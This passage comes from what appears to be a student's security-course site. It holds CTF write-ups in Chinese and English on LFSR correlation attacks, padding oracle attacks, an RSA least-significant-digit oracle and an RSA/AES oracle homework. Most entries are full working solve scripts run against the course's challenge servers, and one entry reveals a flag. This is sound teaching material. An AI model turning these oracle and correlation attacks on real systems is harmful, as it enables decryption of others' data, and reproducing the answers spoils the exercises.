print(bytes.fromhex(plaintext_hex).decode(\u0026#34;cp437\u0026#34;)) :::\n"},{"id":363,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/","title":"Simple Crypto - 0x03(Lab - LFSR)","section":"Securities","content":" Simple Crypto - 0x03(Lab - LFSR) # tags: eductf CTF Crypto # Background # [2022 fall] 0923 Crypto - LFSR Crypto I - LFSR\nSource Code # Must read the source code first with some comment I added :::spoiler source code\nimport random # from secret import FLAG FLAG = b\u0026#39;00001111\u0026#39; class LFSR: def __init__(self, tap, state): self._tap = tap self._state = state def getbit(self): # f is the new bit that append in last position f = sum([self._state[i] for i in self._tap]) \u0026amp; 1 # x is the output bit x = self._state[0] # self._state is a new state self._state = self._state[1:] + [f] return x class triLFSR: def __init__(self, lfsr1, lfsr2, lfsr3): self.lfsr1 = lfsr1 self.lfsr2 = lfsr2 self.lfsr3 = lfsr3 def getbit(self): x1 = self.lfsr1.getbit() x2 = self.lfsr2.getbit() x3 = self.lfsr3.getbit() return x2 if x1 else x3 # These are the state of lfsr1, lfsr2, and lfsr3 A = [random.randrange(2) for _ in range(27)] B = [random.randrange(2) for _ in range(23)] C = [random.randrange(2) for _ in range(25)] print(A, B, C) # tap is a filter that decide the last bit is 1 or 0 tap1 = [0, 13, 16, 26] tap2 = [0, 5, 7, 22] tap3 = [0, 17, 19, 24] lfsr1 = LFSR(tap1, A) lfsr2 = LFSR(tap2, B) lfsr3 = LFSR(tap3, C) cipher = triLFSR(lfsr1, lfsr2, lfsr3) # Transfer the flag to ascii code and expressed in binary # e.g. FLAG = \u0026#39;00001111\u0026#39; → \u0026#39;3030303031313131\u0026#39; → \u0026#39;001100000011000000110000...00110001\u0026#39;(64 bits) flag = map(int, \u0026#39;\u0026#39;.join([\u0026#34;{:08b}\u0026#34;.format(c) for c in FLAG])) output = [] for b in flag: # print(b) output.append(cipher.getbit() ^ b) for _ in range(200): output.append(cipher.getbit()) # print(output) :::\nExploit - Correlation Attack(COR Attack) # :::spoiler exploit\nimport random from tqdm import trange import base64 def initialize(): # Import output file(our cipher flag) File_path = \u0026#34;//wsl.localhost/Ubuntu-20.04/home/sbk6401/NTUCS/Crypto/Lab/cor_485bab3bb2c51396/output.txt\u0026#34; f = open(File_path, \u0026#34;r\u0026#34;) f = f.read().split(\u0026#39;,\u0026#39;) # The first 232 is flag with encrypted cipher_text = [] cipher_flag = [] for i in range(len(f)): if i \u0026lt; 232: cipher_flag.append(int(f[i])) else: cipher_text.append(int(f[i])) # print(cipher_flag, cipher_text) return cipher_flag, cipher_text def cal_correlation(a, b): count = 0 for i in range(200): if a[i] == b[i]: count += 1 return count / 200 def decimalToBinary(n): return bin(n).replace(\u0026#34;0b\u0026#34;, \u0026#34;\u0026#34;) class LFSR: def __init__(self, tap, state): self._tap = tap self._state = state def getbit(self): f = sum([self._state[i] for i in self._tap]) \u0026amp; 1 x = self._state[0] self._state = self._state[1:] + [f] return x class triLFSR: def __init__(self, lfsr1, lfsr2, lfsr3): self.lfsr1 = lfsr1 self.lfsr2 = lfsr2 self.lfsr3 = lfsr3 def getbit(self): x1 = self.lfsr1.getbit() x2 = self.lfsr2.getbit() x3 = self.lfsr3.getbit() return x2 if x1 else x3 def guess_state(state_size_pow, tap, cipher_text): guess_state = [0 for _ in range(state_size_pow)] # Initial guess state result = [] for state in trange(2**state_size_pow): guess_text = [] lfsr = LFSR(tap, guess_state) for _ in range(232): lfsr.getbit() for _ in range(200): guess_text.append(lfsr.getbit()) acc = cal_correlation(guess_text, cipher_text) if acc \u0026gt;= 0.70: # print(guess_state) result.append(guess_state) tmp = decimalToBinary(state + 1 + 3187671) guess_state = [0 for i in range(state_size_pow - len(tmp))] + [int(tmp[i]) for i in range(len(tmp))] return result def final_guess(state_size_pow, tap, cipher_text, b_guess_state, c_guess_state): guess_state = [0 for _ in range(state_size_pow)] # Initial guess state for state in trange(2**state_size_pow): guess_text = [] lfsr1 = LFSR(tap[0], guess_state) lfsr2 = LFSR(tap[1], b_guess_state) lfsr3 = LFSR(tap[2], c_guess_state) cipher = triLFSR(lfsr1, lfsr2, lfsr3) for _ in range(232): cipher.getbit() for _ in range(200): guess_text.append(cipher.getbit()) acc = cal_correlation(guess_text, cipher_text) if acc == 1: print(guess_state) return guess_state tmp = decimalToBinary(state + 1 + 13421773 * 8) guess_state = [0 for i in range(state_size_pow - len(tmp))] + [int(tmp[i]) for i in range(len(tmp))] def binToHexa(n): bnum = int(n) temp = 0 mul = 1 # counter to check group of 4 count = 1 # char array to store hexadecimal number hexaDeciNum = [\u0026#39;0\u0026#39;] * 100 # counter for hexadecimal number array i = 0 while bnum != 0: rem = bnum % 10 temp = temp + (rem*mul) # check if group of 4 completed if count % 4 == 0: # check if temp \u0026lt; 10 if temp \u0026lt; 10: hexaDeciNum[i] = chr(temp+48) else: hexaDeciNum[i] = chr(temp+55) mul = 1 temp = 0 count = 1 i = i+1 # group of 4 is not completed else: mul = mul*2 count = count+1 bnum = int(bnum/10) # check if at end the group of 4 is not # completed if count != 1: hexaDeciNum[i] = chr(temp+48) # check at end the group of 4 is completed if count == 1: i = i-1 # printing hexadecimal number # array in reverse order # print(\u0026#34;\\n Hexadecimal equivalent of {}: \u0026#34;.format(n), end=\u0026#34;\u0026#34;) hex_string = \u0026#39;\u0026#39; while i \u0026gt;= 0: # print(end=hexaDeciNum[i]) # print(hexaDeciNum[i]) hex_string += hexaDeciNum[i] # print(base64.b64decode(hexaDeciNum[i])) i = i-1 return hex_string if __name__ == \u0026#39;__main__\u0026#39;: cipher_flag, cipher_text = initialize() tap = [[0, 13, 16, 26], [0, 5, 7, 22], [0, 17, 19, 24]] B_guess_state = guess_state(23, tap[1], cipher_text) # [1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0] C_guess_state = guess_state(25, tap[2], cipher_text) # [0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0] A_guess_state = final_guess(27, tap, cipher_text, B_guess_state[0], C_guess_state[0]) # [1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0] # B_guess_state = [1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0] # C_guess_state = [0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0] # A_guess_state = [1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0] lfsr1 = LFSR(tap[0], A_guess_state) lfsr2 = LFSR(tap[1], B_guess_state) lfsr3 = LFSR(tap[2], C_guess_state) cipher = triLFSR(lfsr1, lfsr2, lfsr3) output = [] plaintext_bin = \u0026#39;\u0026#39; plaintext_hex = \u0026#39;\u0026#39; for i, b in enumerate(cipher_flag): plaintext_bin += str(cipher.getbit() ^ b) if (i+1) % 8 == 0: plaintext_hex += binToHexa(plaintext_bin) plaintext_bin = \u0026#39;\u0026#39; print(bytes.fromhex(plaintext_hex).decode()) :::\nReference # binary to hex hex to ascii\n"},{"id":364,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/","title":"Simple Crypto - 0x04(2023 Lab - POA)","section":"Securities","content":" Simple Crypto - 0x04(2023 Lab - POA) # Background # Crypto I - Timmy\nSource Code # :::spoiler Source Code\n#! /usr/bin/python3 from Crypto.Cipher import AES import os from secret import FLAG def pad(data, block_size): data += bytes([0x80] + [0x00] * (15 - len(data) % block_size)) return data # padding style: \u0026lt;oooooo[0x80][0x00]...[0x00]\u0026gt; (find first [0x80]) def unpad(data, block_size): if len(data) % block_size: raise ValueError padding_len = 0 for i in range(1, len(data) + 1): if data[-i] == 0x80: padding_len = i break elif data[-i] != 0x00: raise ValueError else: raise ValueError return data[:-padding_len] key = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC) ct = cipher.encrypt(pad(FLAG, AES.block_size)) iv = cipher.iv print((iv + ct).hex()) # same encryption while True: try: inp = bytes.fromhex(input().strip()) # hex style input iv, ct = inp[:16], inp[16:] # get first 16 bytes from input cipher = AES.new(key, AES.MODE_CBC, iv) pt = unpad(cipher.decrypt(ct), AES.block_size) print(\u0026#34;Well received :)\u0026#34;) except ValueError: print(\u0026#34;Something went wrong :(\u0026#34;) :::\nRecon # 這一題是簡單的padding oracle attack，他一樣是應用在CBC mode上，只是他padding的方式和上課教的有一點不一樣，他會先在最後放一個0x80然後接續放0x00直到長度%16==0，同樣的，我們可以用上課教的方式:\nWhat we have: 我們有的東西就是密文，所以可以利用它動一些手腳 Our Goal 1: 目標是要取得原本和47進行XOR的數字是多少 Our Goal 2: 這樣才可以取得最後的明文69 How to achieve: 我們可以簡單猜一個byte，從0x00開始，把密文換成猜測的byte，這樣256種組合和原本的Goal 1所求的byte進行XOR後會padding正確(也就是0x01)，此時假設我們已經猜到目前是0x2f符合padding正確的目標，代表現在的假明文是0x01，則原本和0x47進行XOR的數字就是0x01⊕0x2f，然後我們就可以回到原本解密的流程，也就是原本的密文0x47⊕剛剛得知的(0x01⊕0x2f)，就會得到想要的正確的明文0x69 所以套用到今天的lab意思也是一樣，如果要知道padding是否正確可以問oracle，反正只要符合明文+0x80+(0\u0026hellip;15)*0x00，這一題的flag長度可以從題目給的ciphertext看出來，顯然扣掉16bytes的initial vector後，flag的長度是32 bytes，也就是說我們從第二個block開始解，我們可以單獨把第一個ciphertext block當成第二個ciphertext block的initial vector，合併後再一起送出去，然後不斷變化IV的最後一個byte，如果oracle回傳Well received :)代表第一個bytes猜對了，我們就可以把flag的最後一個bytes求出來$\\to$我們猜的byte⊕原本ciphertext的最後一個byte⊕0x80(0x80是我們判斷padding正確的依據)，當然找到真正的plaintext byte後要把我們猜測的block恢復原狀，接著繼續找下一個byte\nExploit # :::spoiler Whole Exploit Script\nimport sys from pwn import * from tqdm import trange p = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;,10004) # p = process([\u0026#39;python\u0026#39;, \u0026#39;./POA_4af88990ab364609.py\u0026#39;]) ct = p.readline()[:-1].decode() ct = bytes.fromhex(ct) iv, ct1, ct2 = ct[:16], ct[16:32], ct[32:48] flag = bytearray(32) index = 31 count1 = 0 _iv, _ct1, _ct2 = bytearray(ct[:16]), bytearray(ct[16:32]), bytearray(ct[32:48]) for i in range(15, -1, -1): count2 = count1 count1 = 0 for j in range(256): _ct1[i] = j p.sendline(bytearray.hex(_ct1+_ct2).encode()) reply = p.readline()[:-1].decode() if reply == \u0026#39;Well received :)\u0026#39;: count1 += 1 if j != ct1[i]: flag[index] = ct1[i] ^ _ct1[i] ^ 128 if abs(count1 - count2) == 1: flag[index] = 128 _ct1[i] = 0 ^ flag[index] ^ ct1[i] index -= 1 _iv, _ct1, _ct2 = bytearray(ct[:16]), bytearray(ct[16:32]), bytearray(ct[32:48]) for i in range(15, -1, -1): for j in range(256): _iv[i] = j p.sendline(bytearray.hex(_iv+_ct1).encode()) reply = p.readline()[:-1].decode() if reply == \u0026#39;Well received :)\u0026#39;: flag[index] = _iv[i] ^ iv[i] ^ 128 break _iv[i] = 0 ^ flag[index] ^ iv[i] index -= 1 print(bytes(flag)) :::\n"},{"id":365,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/","title":"Simple Crypto - 0x05(2023 Lab - LSB)","section":"Securities","content":" Simple Crypto - 0x05(2023 Lab - LSB) # Background # [edu-ctf 2023] week01 - crypto1 Source code # :::spoiler Source Code\n#! /usr/bin/python3 from Crypto.Util.number import bytes_to_long, getPrime import os from secret import FLAG p = getPrime(1024) q = getPrime(1024) n = p * q phi = (p - 1) * (q - 1) e = 65537 d = pow(e, -1, phi) m = bytes_to_long(FLAG + os.urandom(256 - len(FLAG))) assert m \u0026lt; n enc = pow(m, e, n) print(n) print(e) print(enc) while True: inp = int(input().strip()) pt = pow(inp, d, n) print(pt % 3) :::\nRecon # 這一題是變形過的Lease Significant Bit，上課教的例子是mod 2下的結果，而看source code可以知道目前他是mod 3下的結果，但換湯不換藥，只要把上課教的部分全部換成mod 3就可以了\n首先計算$3^{-1},3^{-2},3^{-3},3^{-4},\u0026hellip;,3^{-(log_3^n)}\\ (mod\\ 3)$，並建立一個table 依序執行上課教的流程 密文*$(3^{-1})^e$ 合併要減掉的部分，也就是把之前已知道所有部分都乘以table上對應的反元素 再把oracle回傳的假明文減掉上面合併的部分(記得mod)，就是我們要的bit Exploit # :::spoiler Whole Scrip\nfrom pwn import remote from Crypto.Util.number import long_to_bytes, inverse from math import log proc = remote(\u0026#34;edu-ctf.zoolab.org\u0026#34;, 10005) n, e, enc = proc.recvlines(3) n = int(n.decode()) e = int(e.decode()) enc = int(enc.decode()) print(f\u0026#34;n is {n}\u0026#34;) print(f\u0026#34;e is {e}\u0026#34;) mult = inverse(pow(3, e, n), n) msg = enc pt = [] pow_3_inv_tbl = [ pow(3, -i, n) for i in range(int(log(n, 3))) ] for i in range(int(log(n, 3))): proc.sendline(str(msg).encode()) res = int(proc.recvline().strip()) sub = 0 for idx, p in enumerate(pt): sub = (sub + ((p * pow_3_inv_tbl[i-idx]) % n)) % n pt.append((res - sub) %3) if i % 100 == 0: print(long_to_bytes(int(\u0026#34;\u0026#34;.join([str(p) for p in pt][::-1]), 3))) msg = (msg * mult) % n print(long_to_bytes(int(\u0026#34;\u0026#34;.join([str(p) for p in pt][::-1]), 3))) :::\n"},{"id":366,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/","title":"Simple Crypto - 0x06(2023 HW - LFSR)","section":"Securities","content":" Simple Crypto - 0x06(2023 HW - LFSR) # Background # Python – List XOR from funtools import reduce test_list = [4, 6, 2, 3, 8, 9] res = reduce(lambda x, y: x ^ y, test_list) # The output is 2 Numpy矩陣乘法，但不是乘法，而是XOR的元素 import numpy as np m1 = np.array([[1, 0, 0], [0, 0, 0], [0, 0, 0]]) m2 = np.array([[1, 0, 1], [0, 0, 1], [1, 1, 1]]) mr = np.empty((m2.shape[0], m1.shape[1]), dtype = np.int64) for i in range(mr.shape[0]): for j in range(mr.shape[1]): mr[i, j] = np.sum(m1[:, j] ^ m2[i, :]) print(mr) 使用 Python 來認識矩陣 [Day07]Learning Numpy - 建立、合併、分割 - CheetSheet for Numpy Sage $ sudo apt install sagemath -y # wsl/unix base可以直接安裝，如果是windows要下載sage binary，有1.4GB $ sage -n # 開起sage notebook，也就是可以用sage kernel運行jupyter $ sage \u0026lt;.py/.sage file\u0026gt; # 用sage運行腳本 $ sage # 直接開啟sage interactive shell Recon # 這一題和前面的triLFSR不一樣的地方在於他只有一層的LFSR，但他只會每個70個才會給一個state，換句話說我們只能拿到$S_{710+70},\\ S_{711+70},\\ S_{712+70},\\ S_{713+70}\u0026hellip;$(從0開始算)，而前面256個拿到的State最後會和flag進行XOR，只有最後70個是最純粹的State\nWhat we have 我們有的東西就是Companion Matrix，因為題目有給taps，所以可以建出上課提到的矩陣；另外我們還有最後出現的70個State，雖然是每格70個出現一次，換句話說就是$State_{71256+70},\\ State_{71257+70},\\ State_{71258+70},\\ \u0026hellip;State_{71325+70}$(從0開始算)\nGoal 既然我們知道了State的公式為$s_m = p_0s_0 + p_1s_1 + … + p_{m-1}s_{m-1}$，也就是companion matrix的最後一列$*$那64個initial state就會是新的state，換句話說，繼續往下做，其實就只是把companion matrix多乘幾次，然後還是一樣乘以initial state，然後我們只要取得companion matrix乘完之後的最後一列，就是下一個新的state的特徵，如下圖所示: 在Round 0時，companion matrix的最後一列當然就是$S_{64}$的特徵，再往下做，也就是Round 1時，companion matrix的平方後，再取最後一列就是$S_{65}$的特徵，而題目給我們的ouptut[0]以state來說就是第70個(以0來說)，所以companion matrix的7次方，再取最後一列，以此類推，我們陸續算到output[256](這是第一個沒有和flag XOR的bit)，也就是companion matrix的$71256+7=18183$次方再取最後一列，就是$S_{71256+70}$的特徵，自此開始，我們就可以開始把這些特徵存起來，存滿64個後，再取反矩陣，乘上原本得到的那64個state，就可以得到一開始的initial state\n完整的對應關係如下圖 Exploit # 陷阱1: 此題所有的運算接在mod 2底下運算，包含內積和反矩陣，所以需要用sage的語法幫助我們快速算出答案(真的差很多，如果是手刻不用sage，至少要花一小時，但用了sage，只需要10秒，真香啊!!!) 在Modular 2的情況下內積，乘法會對應到AND，而加法對應到XOR，在sage中語法如下 sage: a = Matrix([[1,1,0],[0,1,0],[0,0,1]]) sage: b = Matrix([[1,1,1],[1,1,0],[1,1,1]]) sage: a * b [2 2 1] [1 1 0] [1 1 1] sage: a * b % 2 [0 0 1] [1 1 0] [1 1 1] 在sage中要計算modular下的inverse matrix，語法如下 sage: a = Matrix([[1, 2], [3,4]]) sage: b = Matrix(IntegerModRing(7), a).inverse() sage: b [5 1] [5 3] sage: a * b [1 0] [0 1] 陷阱2: 其實也不算陷阱，反正就是要很細心處理每一個state和for loop中的i之間的關係變化，其實上面就有完整演練一遍，只要按圖施工保證成功 陷阱3: 在sage中，如果要表達XOR是用^^表示，而非python常見的^，因為這在sage中代表次方 小技巧: 如果不知道實作的方式對不對，可以直接用原本題目給的code，寫死已知的initial state，然後把output印出來後照著原本設計的邏輯，看能不能還原initial state :::spoiler Whole Exploit with Sage from tqdm import trange import numpy as np class LFSR: def __init__(self, tap, state): self._tap = tap self._state = state def getbit(self): f = sum([self._state[i] for i in self._tap]) \u0026amp; 1 x = self._state[0] self._state = self._state[1:] + [f] return x def verification(taps, key): randomness = LFSR(taps, key) output = [] for _ in range(256 + 64): for __ in range(70): randomness.getbit() output.append(randomness.getbit()) return output[:256], output[256:] def get_flag(cipher_flag, output): flag = \u0026#34;\u0026#34; plaintext_hex = \u0026#39;\u0026#39; for idx, i in enumerate(range(len(cipher_flag))): flag += str(output[i] ^^ cipher_flag[i]) if (idx+1) % 8 == 0: plaintext_hex += hex(int(flag, 2))[2:] flag = \u0026#34;\u0026#34; return bytes.fromhex(plaintext_hex).decode(\u0026#34;cp437\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: f = [0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0] # Initialization taps = [0, 2, 17, 19, 23, 37, 41, 53] init_state_size = 64 cipher_text_xor_flag, cipher_text = f[:len(f)-70], f[len(f)-70:] cipher_text = Matrix(np.array(cipher_text[:init_state_size]).reshape((init_state_size, 1)).tolist()) # Create companion Matrix a = np.eye(init_state_size-1, dtype = int) # 創造對角矩陣 b = np.zeros((init_state_size-1, 1), dtype=int) # 創造最左邊全為0的行 c = np.array([1 if i in taps else 0 for i in range(init_state_size)]) # 創造最後一列的taps comp_matrix = Matrix(np.vstack([np.hstack([b, a]), c]).tolist()) # 全部組合起來 # 做內積的運算 _comp_matrix = comp_matrix # _comp_matrix代表會變動的companion matrix real_comp_matrix = np.empty(init_state_size, dtype=int) count = 256 arr_merge = True for i in trange(71*319+6+1): _comp_matrix = comp_matrix * _comp_matrix % 2 # 因為是在mod 2底下處理，所以不是普通的dot運算，乘法對應到AND，加法對應到XOR if i == 71 * count + 5: real_comp_matrix = np.vstack([real_comp_matrix, _comp_matrix[-1]]) count += 1 # 計算在模2情況下的反矩陣 inv_real_comp_matrix = Matrix(IntegerModRing(2), real_comp_matrix[1:]).inverse() # 算出initial state init_state = inv_real_comp_matrix * cipher_text % 2 init_state = list(init_state.numpy().reshape(1, init_state_size)[0]) print(\u0026#34;Initial State = \u0026#34;, init_state) output, check = verification(taps, [0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1]) assert list(cipher_text.numpy().reshape(1, 64)[0]) == check # 如果assert通過，代表找到正確的initial state然後就可以反算flag print(get_flag(cipher_text_xor_flag, output)) :::\nFlag: FLAG{Lf5r_15_50_eZZzZzZZZzzZzzz}\n"},{"id":367,"href":"/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/","title":"Simple Crypto - 0x07(2023 HW - Oracle)","section":"Securities","content":" Simple Crypto - 0x07(2023 HW - Oracle) # Background # POA/RSA\nSource code # :::spoiler Oracle.py\nfrom Crypto.Util.number import bytes_to_long from Crypto.Cipher import AES from random import randbytes from secret import aes_key, p, q def pad(m): length = 16-len(m) % 16 return m + chr(length).encode()*length def unpad(c): length = c[-1] for char in c[-length:]: if char != length: raise ValueError return c[:-length] def asymmetric_encryption(message, N, e): # encrypt message with RSA # message must be 16 bytes # padding 100 bytes random value padded_message = randbytes(100) + message return pow(bytes_to_long(padded_message), e, N) def symmetric_encryption(message, key): # ecrypt message with AES + CBC Mode # message can be arbitrary length cipher = AES.new(key, AES.MODE_CBC) ct = cipher.encrypt(pad(message)) iv = cipher.iv return iv, ct ## Alice: This is my public key. # p = getPrime(512) # q = getPrime(512) N = p * q e = 65537 print( f\u0026#34;{N = }, {e = }\u0026#34; ) # N = 69214008498642035761243756357619851816607540327248468473247478342523127723748756926949706235406640562827724567100157104972969498385528097714986614165867074449238186426536742677816881849038677123630836686152379963670139334109846133566156815333584764063197379180877984670843831985941733688575703811651087495223 # e = 65537 ## Bob: I want to send message to Alice! But my message is too looooooong...... flag = open(\u0026#34;flag.png\u0026#34;, \u0026#34;rb\u0026#34;).read() ## Bob: Oh! I can use symmetric encryption. iv, ct = symmetric_encryption(flag, aes_key) encrypted_key = asymmetric_encryption(aes_key, N, e) encrypted_iv = asymmetric_encryption(iv, N, e) print( f\u0026#34;{encrypted_key = }\u0026#34; ) print( f\u0026#34;{encrypted_iv = }\u0026#34; ) open(\u0026#34;encrypted_flag.not_png\u0026#34;, \u0026#34;wb\u0026#34;).write(ct) ## Bob: Ha ha! Now no one can decrypt my message except Alice! # encrypted_key = 65690013242775728459842109842683020587149462096059598501313133592635945234121561534622365974927219223034823754673718159579772056712404749324225325531206903216411508240699572153162745754564955215041783396329242482406426376133687186983187563217156659178000486342335478915053049498619169740534463504372971359692 # encrypted_iv = 35154524936059729204581782839781987236407179504895959653768093617367549802652967862418906182387861924584809825831862791349195432705129622783580000716829283234184762744224095175044663151370869751957952842383581513986293064879608592662677541628813345923397286253057417592725291925603753086190402107943880261658 ::: :::spoiler Alice.py\nfrom Crypto.Util.number import long_to_bytes, inverse from Crypto.Cipher import AES from secret import p, q import signal def alarm(second): def handler(signum, frame): print(\u0026#39;Timeout!\u0026#39;) exit() signal.signal(signal.SIGALRM, handler) signal.alarm(second) def pad(m): length = 16-len(m) % 16 return m + chr(length).encode()*length def unpad(c): length = c[-1] for char in c[-length:]: if char != length: raise ValueError return c[:-length] ## Alice: Okay! AES with CBC mode. I know it. if __name__ == \u0026#34;__main__\u0026#34;: alarm(300) N = p * q e = 65537 d = pow(e, -1, (p-1)*(q-1)) while True: try: encrypted_key = int( input(\u0026#34;Give me the encrypted key: \u0026#34;) ) encrypted_iv = int( input(\u0026#34;Give me the encrypted iv: \u0026#34;) ) ct = bytes.fromhex( input(\u0026#34;Give me the ciphertext: \u0026#34;) ) # decrypt asymmetric_encryption() aes_key = long_to_bytes(pow(encrypted_key, d, N))[-16:] iv = long_to_bytes(pow(encrypted_iv, d, N))[-16:] # decrypt symmetric_encryption() cipher = AES.new(aes_key, AES.MODE_CBC, iv) tmp = cipher.decrypt(ct) pt = unpad(tmp) print(f\u0026#34;OK! Got it.\u0026#34;) except ValueError: print(\u0026#34;I do not understand.\u0026#34;) except: print(\u0026#34;Bye~~\u0026#34;) break :::\n:::spoiler 加密的圖片檔案(Hex Ver.)\ :::\nRecon # 這一題真的非常難，而且要通靈很久，首先Oracle.py的工作是把一張flag image用AES加密，並且把AES會用到的key/iv都用RSA再加密，然後通通傳給Alice，而Alice.py的工作才是本次作業實際上的Oracle，他會吃key/iv/ciphertext，前兩者是decimal，後者是hex形式，一開始可以先試看看把這三者傳過去，理論上只要格式對了就會回傳OK! Got it.\nencrypted_key = 65690013242775728459842109842683020587149462096059598501313133592635945234121561534622365974927219223034823754673718159579772056712404749324225325531206903216411508240699572153162745754564955215041783396329242482406426376133687186983187563217156659178000486342335478915053049498619169740534463504372971359692 encrypted_iv = 35154524936059729204581782839781987236407179504895959653768093617367549802652967862418906182387861924584809825831862791349195432705129622783580000716829283234184762744224095175044663151370869751957952842383581513986293064879608592662677541628813345923397286253057417592725291925603753086190402107943880261658 enc_png = open(\u0026#39;./Crypto/HW/Oracle/encrypted_flag_d6fbfd5306695c4a.not_png\u0026#39;, \u0026#39;rb\u0026#39;).read() r = remote(\u0026#34;10.113.184.121\u0026#34;, 10031) r.sendlineafter(b\u0026#39;key: \u0026#39;, str(encrypted_key).encode()) r.sendlineafter(b\u0026#39;iv: \u0026#39;, str(encrypted_iv).encode()) r.sendlineafter(b\u0026#39;ciphertext: \u0026#39;, enc_png.hex().encode()) print(r.recvline().decode().strip()) 解題的手法經@Yaan的小提示，完整如下:\n首先我們手上可控的地方，就是key/iv/ciphertext，一開始的想法是，由於此次的flag是一張png，所以一開始的magic header一定都一樣，所以可以透過這個magic header推測出IV是多少，但這樣的作法卻沒辦法知道key，所以這個方法行不通\n正確的作法是控制key/iv，變成自己設定的東西，然後試圖加密plaintext(同樣也是自己設定)，然後把自己設定的ciphertext/key以及原本題目給的encrypted_key或是encrypted_iv丟到oracle，要解密的部分(也就是encrypted_key/encrypted_iv)就當作是iv的部分輸入，這樣神奇的操作如下圖所示 為甚麼這樣可以解出我們想要解的東西?那就要取決於如何控制plaintext/iv，key可以隨便控，而plaintext則是從零開始，iv也是全部都是零，這樣的好處是pt用AES加密前的部份是我們知道的，換句話說，在解密的時候和iv XOR前的數值也是知道的，此時我們可以從oracle output知道padding正確與否，我們又知道和iv XOR的數值是多少，則我們一定可以利用POA的方式推出原本的IV是多少\n舉個例子 若 encrypted_iv=b'0123456789abcdef' $\\to$ unknown(也是我們想知道的部分) self_pt=b'0000000000000000' $\\to$ self defined self_iv=b'0000000000000000' $\\to$ self defined 則我們開始改變self_pt的最後一個byte，也就是b'0...00',b'0...01',b'0...02'\u0026hellip;，讓他和encrypted_iv進行XOR之後判斷padding正確與否\n如果padding正確也就代表目前的padding結果是0x01，而此時的self_pt=b'0...0e'，所以想當然encrypted_iv=XXX...f，而換到下一round，我們也改造一下self_pt，首先原本最後一個byte(0xe)要改成$0xe\\oplus 0x2=0xc$，因為下一round的padding必須要是0x0202才會正確，然後我們就可以改變倒數第二個byte(一樣從零開始)，也就是b'0...0c',b'0...1c',b'0...2c'\u0026hellip;，以此類推就可以得出真正的IV是多少了，而encrypted_key的做法也和IV一模一樣\nExploit # :::spoiler SpeedUp Version(只考慮同一個byte只有一種可能的版本)\nfrom pwn import * from Crypto.Util.number import long_to_bytes, bytes_to_long from Crypto.Cipher import AES from random import randbytes def unpad(c): length = c[-1] for char in c[-length:]: if char != length: raise ValueError return c[:-length] def asymmetric_encryption(message, N, e): # encrypt message with RSA # message must be 16 bytes # padding 100 bytes random value padded_message = b\u0026#39;\\x01\u0026#39; * 100 + message return pow(bytes_to_long(padded_message), e, N) def symmetric_encryption(message, key, iv): # ecrypt message with AES + CBC Mode # message can be arbitrary length cipher = AES.new(key, AES.MODE_CBC, iv) ct = cipher.encrypt(message) iv = cipher.iv return iv, ct def compute_know_part(padding_idx, known_key): if known_key == \u0026#39;\u0026#39;: return b\u0026#39;\u0026#39; known_part = b\u0026#39;\u0026#39; for i in range(len(known_key)//2): known_part += bytes([int(known_key[i*2:i*2+2], 16) 